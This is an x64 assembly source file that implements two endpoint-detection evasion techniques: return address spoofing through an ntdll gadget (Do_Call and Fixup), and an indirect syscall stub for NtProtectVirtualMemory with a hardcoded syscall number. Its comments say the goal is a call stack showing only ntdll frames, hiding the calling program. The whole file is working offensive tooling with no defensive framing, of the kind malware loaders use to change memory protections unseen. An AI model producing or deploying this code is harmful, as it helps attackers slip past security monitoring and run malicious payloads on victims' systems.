; asm.asm - Return Address Spoofing + Indirect Syscalls
; Combines two evasion techniques:
;   1. Return address spoofing: replaces call stack with ntdll addresses
;   2. Indirect syscalls: jumps to syscall instruction inside ntdll
;      bypassing KERNELBASE entirely
;
; Result: call stack for NtProtectVirtualMemory shows only ntdll frames,
; no user program and no KERNELBASE.

section .text

global Do_Call
global Fixup
global NtProtectVirtualMemory_Indirect

; ---------- Return Address Spoofing ----------

Do_Call:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    push rbp

    mov r13, rsp
    mov r10, [rcx]
    mov r14, [rcx + 0x10]

    sub rsp, 0x100
    lea r12, [rel Fixup]
    mov [rsp + 0x200 + 0x8], rsi
    mov [rsp + 0x200 + 0x10], rdi
    mov [rsp + 0x200 + 0x18], r12
    sub rsp, 0x200
    mov [rsp], r14

    mov r9, [rcx + 0x30]
    mov r8, [rcx + 0x28]
    mov rdx, [rcx + 0x20]
    mov rcx, [rcx + 0x18]
    jmp r10

Fixup:
    mov rsp, r13
    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ---------- Indirect Syscall for NtProtectVirtualMemory ----------
; SSN (System Service Number) for NtProtectVirtualMemory = 0x50
;
; void NtProtectVirtualMemory_Indirect(
;     HANDLE ProcessHandle,     // rcx
;     PVOID* BaseAddress,       // rdx
;     PSIZE_T RegionSize,       // r8
;     ULONG NewProtect,         // r9
;     PULONG OldProtect,        // [rsp+0x28]
;     PVOID SyscallGadget       // [rsp+0x30]
; );

NtProtectVirtualMemory_Indirect:
    mov r10, rcx                    ; NtProtectVirtualMemory convention
    mov eax, 0x50                   ; SSN for NtProtectVirtualMemory
    mov r11, [rsp + 0x30]           ; 6th argument = SyscallGadget address
    jmp r11                         ; Jump to syscall; ret in ntdll
